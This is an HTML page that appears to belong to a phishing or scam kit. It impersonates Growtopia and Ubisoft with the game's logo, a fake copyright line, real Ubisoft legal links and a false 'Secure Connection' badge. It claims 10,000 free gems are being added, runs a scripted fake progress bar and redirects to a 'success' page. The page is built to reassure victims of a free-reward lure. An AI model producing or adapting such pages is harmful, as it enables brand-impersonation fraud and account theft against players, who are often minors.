<!-- processing.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Processing Reward...</title>
  <style>
    body { background: #f4f4f4; font-family: Arial, sans-serif; margin: 0; padding: 0; text-align: center; }
    .login-box { background: #fff; max-width: 350px; margin: 60px auto; padding: 20px; 
                 border: 1px solid #e0e0e0; border-radius: 4px; }
    .login-box img.logo { max-width: 180px; margin: 0 auto 20px auto; display: block; }
    .login-box h2 { font-size: 18px; color: #333; margin-bottom: 10px; }
    .login-box p { font-size: 14px; color: #555; margin-bottom: 20px; }
    #progress-bar { width: 100%; background: #eee; border: 1px solid #ccc; border-radius: 3px; overflow: hidden; margin-bottom: 10px; }
    #progress-fill { width: 0%; height: 20px; background: #4caf50; }
    footer { font-size: 11px; color: #777; text-align: center; padding: 15px 5px; }
    footer a { color: #337ab7; text-decoration: none; margin: 0 5px; }
    footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/fr/e/e0/Growtopia_Logo.png" alt="Growtopia" class="logo">
    <h2>Reward Processing...</h2>
    <p>Your reward is being processed. Please wait while 10,000 gems are added to your account.</p>
    <div id="progress-bar">
      <div id="progress-fill"></div>
    </div>
    <p><strong>Do not close this window.</strong></p>
  </div>
  <footer>
    ðŸ”’ Secure Connection | Â© 2025 Ubisoft Entertainment. All rights reserved. | 
    <a href="https://legal.ubi.com/privacypolicy/" target="_blank">Privacy Policy</a> | 
    <a href="https://legal.ubi.com/termsofuse/" target="_blank">Terms of Use</a> | 
    <a href="https://www.ubisoft.com/en-us/help/growtopia" target="_blank">Support</a>
  </footer>

  <script>
    // Simulate a progress bar filling up, then redirect to final page
    var fill = document.getElementById('progress-fill');
    var width = 0;
    var progressInterval = setInterval(function() {
      if (width >= 100) {
        clearInterval(progressInterval);
        // After reaching 100%, wait a moment then redirect to the success page
        setTimeout(function() {
          window.location.href = "success.html";
        }, 500);
      } else {
        width += 1;
        fill.style.width = width + "%";
      }
    }, 50); // 50ms interval -> 5 seconds for full bar
  </script>
</body>
</html>
